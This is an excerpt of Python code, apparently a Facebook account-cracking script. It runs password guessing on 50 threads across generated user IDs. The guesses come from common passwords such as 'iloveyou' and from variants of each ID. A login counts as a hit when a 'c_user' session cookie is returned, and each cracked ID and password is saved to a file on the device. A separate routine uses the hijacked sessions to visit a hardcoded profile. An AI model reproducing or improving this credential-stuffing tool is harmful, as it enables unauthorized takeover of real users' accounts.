...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/100077473742575', {
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[0:],love[1:],love[2:],code+love,'bangladesh','iloveyou','i love you']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAIMON-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
